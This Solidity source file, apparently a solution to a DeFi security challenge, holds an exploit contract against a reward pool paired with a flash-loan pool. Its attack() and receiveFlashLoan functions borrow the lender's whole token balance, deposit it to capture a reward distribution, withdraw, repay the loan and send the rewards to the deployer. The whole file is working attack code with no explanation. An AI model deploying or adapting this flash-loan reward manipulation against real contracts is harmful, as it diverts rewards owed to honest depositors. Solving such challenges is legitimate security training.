// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "hardhat/console.sol";

contract MaliciousRewarded {
    TheRewarderPool rewardPool;
    FlashLoanerPool loanPool;
    address payable owner;

    constructor(address payable _rPool, address payable _lPool) {
        rewardPool = TheRewarderPool(_rPool);
        loanPool = FlashLoanerPool(_lPool);
        owner = payable(msg.sender);
    }
    function attack() external {
        uint256 amount = loanPool.liquidityToken().balanceOf(address(loanPool));
        loanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log("Received flash loan %s", amount);
        loanPool.liquidityToken().approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        console.log("My accToken: %s", rewardPool.accToken().balanceOf(address(this)));
        rewardPool.withdraw(amount);
        loanPool.liquidityToken().transfer(address(loanPool), amount);
        rewardPool.rewardToken().transfer(owner, rewardPool.rewardToken().balanceOf(address(this)));
    }
}